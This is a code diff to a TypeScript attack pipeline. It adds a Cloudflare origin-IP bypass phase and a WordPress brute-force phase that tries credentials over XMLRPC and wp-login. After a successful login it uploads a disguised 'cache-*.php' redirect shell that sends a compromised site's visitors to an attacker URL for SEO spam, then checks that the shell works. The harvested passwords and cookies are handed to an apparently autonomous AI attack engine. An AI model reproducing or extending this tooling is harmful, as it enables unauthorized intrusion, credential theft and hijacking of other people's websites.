@@ -31,6 +31,8 @@ import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
 import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
+import { findOriginIP, type OriginIPResult } from "./cf-origin-bypass";
+import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCredentials } from "./wp-brute-force";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -70,7 +72,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -137,6 +139,11 @@ export interface PipelineResult {
     totalDurationMs: number;
     decisionsCount: number;
   } | null;
+  // CF Origin IP Bypass
+  cfBypassResult?: OriginIPResult | null;
+  // WP Brute Force
+  wpBruteForceResult?: BruteForceResult | null;
+  wpAuthCredentials?: WPCredentials | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1009,6 +1016,168 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
+  // ─── Phase 2.5c: Cloudflare Origin IP Bypass (Advanced) ───
+  let cfBypassResult: OriginIPResult | null = null;
+  const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || "";
+  const isCloudflare = wafDetected.toLowerCase().includes("cloudflare");
+  
+  if (isCloudflare) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      onEvent({
+        phase: "cf_bypass",
+        step: "scanning",
+        detail: "☁️ Phase 2.5c: Cloudflare Origin IP Bypass — Shodan SSL, DNS History, MX/SPF, Subdomain Enum...",
+        progress: 41,
+      });
+
+      cfBypassResult = await Promise.race([
+        findOriginIP(targetDomain, (msg) => {
+          onEvent({
+            phase: "cf_bypass",
+            step: "scanning",
+            detail: `☁️ ${msg}`,
+            progress: 42,
+          });
+        }),
+        new Promise<OriginIPResult>((_, reject) => setTimeout(() => reject(new Error("CF bypass timeout")), 90000)),
+      ]);
+
+      if (cfBypassResult.found && cfBypassResult.originIP) {
+        originIp = cfBypassResult.originIP;
+        aiDecisions.push(`☁️ CF Bypass สำเร็จ! Origin IP: ${originIp} (confidence: ${cfBypassResult.confidence}%, source: ${cfBypassResult.method}, verified: ${cfBypassResult.verified})`);
+      } else if (cfBypassResult.allCandidates.length > 0) {
+        // Use best unverified candidate
+        const bestCandidate = cfBypassResult.allCandidates.sort((a, b) => b.confidence - a.confidence)[0];
+        originIp = bestCandidate.ip;
+        aiDecisions.push(`☁️ CF Bypass: Origin IP candidate ${originIp} (unverified, confidence: ${bestCandidate.confidence}%, source: ${bestCandidate.source})`);
+      }
+
+      onEvent({
+        phase: "cf_bypass",
+        step: "complete",
+        detail: `✅ CF Bypass เสร็จ — ${cfBypassResult.allCandidates.length} candidates, verified: ${cfBypassResult.verified}${originIp ? `, Origin IP: ${originIp}` : ""}`,
+        progress: 43,
+        data: { cfBypassResult, originIp },
+      });
+    } catch (error: any) {
+      errors.push(`CF bypass failed: ${error.message}`);
+      onEvent({
+        phase: "cf_bypass",
+        step: "error",
+        detail: `⚠️ CF Bypass ล้มเหลว: ${error.message}`,
+        progress: 43,
+      });
+    }
+  }
+
+  // ─── Phase 2.5d: WP Brute Force (if WordPress detected) ───
+  let wpBruteForceResult: BruteForceResult | null = null;
+  let wpAuthCredentials: WPCredentials | null = null;
+  const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || "").toLowerCase();
+  const isWordPress = detectedCms.includes("wordpress") || detectedCms === "wp";
+
+  if (isWordPress) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      onEvent({
+        phase: "wp_brute_force",
+        step: "scanning",
+        detail: "🔑 Phase 2.5d: WP Brute Force — Username enum + XMLRPC/wp-login credential testing...",
+        progress: 44,
+      });
+
+      wpBruteForceResult = await Promise.race([
+        wpBruteForce({
+          targetUrl: config.targetUrl,
+          domain: targetDomain,
+          maxAttempts: 50,
+          delayBetweenAttempts: 800,
+          originIP: originIp,
+          onProgress: (msg) => {
+            onEvent({
+              phase: "wp_brute_force",
+              step: "testing",
+              detail: `🔑 ${msg}`,
+              progress: 45,
+            });
+          },
+        }),
+        new Promise<BruteForceResult>((_, reject) => setTimeout(() => reject(new Error("brute force timeout")), 120000)),
+      ]);
+
+      if (wpBruteForceResult.success && wpBruteForceResult.credentials) {
+        wpAuthCredentials = wpBruteForceResult.credentials;
+        aiDecisions.push(`🔑 WP Brute Force สำเร็จ! User: ${wpAuthCredentials.username} via ${wpAuthCredentials.method} (${wpBruteForceResult.attemptsMade} attempts)`);
+        
+        // Immediately try authenticated upload with quick redirect shell
+        {
+          const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+          onEvent({
+            phase: "wp_brute_force",
+            step: "uploading",
+            detail: "🔑 ลอง authenticated upload ด้วย credentials ที่ได้...",
+            progress: 46,
+          });
+
+          const uploadResult = await wpAuthenticatedUpload(
+            config.targetUrl,
+            targetDomain,
+            wpAuthCredentials,
+            `cache-${Math.random().toString(36).slice(2, 10)}.php`,
+            quickShell,
+            "application/x-php",
+            originIp,
+            (msg) => {
+              onEvent({
+                phase: "wp_brute_force",
+                step: "uploading",
+                detail: `🔑 ${msg}`,
+                progress: 47,
+              });
+            }
+          );
+
+          if (uploadResult.success && uploadResult.url) {
+            aiDecisions.push(`🎯 Authenticated upload สำเร็จ: ${uploadResult.url}`);
+            // Verify the upload
+            const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);
+            const uploadedFile: UploadedFile = {
+              url: uploadResult.url,
+              shell: { type: "redirect_php", content: quickShell, filename: "cache.php", contentType: "application/x-php", description: "Quick redirect via brute force auth", id: `bf_${Date.now()}`, targetVector: "wp_brute_force", bypassTechniques: ["auth_login"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+              method: `wp_brute_force_${wpAuthCredentials.method}`,
+              verified: verification.verified,
+              redirectWorks: verification.redirectWorks,
+              redirectDestinationMatch: verification.redirectDestinationMatch,
+              finalDestination: verification.finalDestination,
+              httpStatus: verification.httpStatus,
+              redirectChain: verification.redirectChain,
+            };
+            if (verification.verified) uploadedFiles.push(uploadedFile);
+          }
+        }
+      } else {
+        aiDecisions.push(`🔑 WP Brute Force: ${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users found, no valid credentials`);
+      }
+
+      onEvent({
+        phase: "wp_brute_force",
+        step: "complete",
+        detail: `✅ WP Brute Force เสร็จ — ${wpBruteForceResult.success ? "สำเร็จ!" : "ไม่พบ credentials"} (${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users)`,
+        progress: 48,
+        data: { wpBruteForceResult, wpAuthCredentials: wpAuthCredentials ? { username: wpAuthCredentials.username, method: wpAuthCredentials.method } : null },
+      });
+    } catch (error: any) {
+      errors.push(`WP brute force failed: ${error.message}`);
+      onEvent({
+        phase: "wp_brute_force",
+        step: "error",
+        detail: `⚠️ WP Brute Force ล้มเหลว: ${error.message}`,
+        progress: 48,
+      });
+    }
+  }
+
   // ─── Cloaking variables (will be populated AFTER upload succeeds) ───
   let cloakingResult: CloakingShellResult | null = null;
   let contentPack: ContentPack | null = null;
@@ -1692,9 +1861,9 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ─── Phase 4.7: Non-WP CMS Exploits (before shellless, after WP-specific attacks) ───
-  const detectedCms = (prescreen?.cms || vulnScan?.cms?.type || "").toLowerCase();
-  const isNonWpTarget = detectedCms && detectedCms !== "wordpress" && detectedCms !== "shopify" && detectedCms !== "wix" && detectedCms !== "squarespace";
-  const isGenericTarget = !detectedCms || detectedCms === "unknown" || detectedCms === "custom";
+  const detectedCmsForNonWp = (prescreen?.cms || vulnScan?.cms?.type || "").toLowerCase();
+  const isNonWpTarget = detectedCmsForNonWp && detectedCmsForNonWp !== "wordpress" && detectedCmsForNonWp !== "shopify" && detectedCmsForNonWp !== "wix" && detectedCmsForNonWp !== "squarespace";
+  const isGenericTarget = !detectedCmsForNonWp || detectedCmsForNonWp === "unknown" || detectedCmsForNonWp === "custom";
   const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;
 
   if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget)) {
@@ -2253,6 +2422,16 @@ export async function runUnifiedAttackPipeline(
         preAnalysis: aiTargetAnalysis,
         userId: config.userId,
         pipelineType: "autonomous",
+        // v4: Pass CF bypass origin IP and WP credentials
+        originIP: originIp,
+        wpCredentials: wpAuthCredentials ? {
+          username: wpAuthCredentials.username,
+          password: wpAuthCredentials.password,
+          method: wpAuthCredentials.method,
+          cookies: wpAuthCredentials.cookies,
+          nonce: wpAuthCredentials.nonce,
+          authHeader: wpAuthCredentials.authHeader,
+        } : null,
         onEvent: (event: AiCommanderEvent) => {
           onEvent({
             phase: "shellless" as any,
@@ -2378,6 +2557,11 @@ export async function runUnifiedAttackPipeline(
     aiTargetAnalysis: aiTargetAnalysis || undefined,
     // Non-WP exploit results
     nonWpExploitResults: nonWpExploitResults || undefined,
+    // CF Origin IP Bypass result
+    cfBypassResult: cfBypassResult || undefined,
+    // WP Brute Force result
+    wpBruteForceResult: wpBruteForceResult || undefined,
+    wpAuthCredentials: wpAuthCredentials || undefined,
     // AI Commander result
     aiCommanderResult: aiCommanderResult ? {
       success: aiCommanderResult.success,
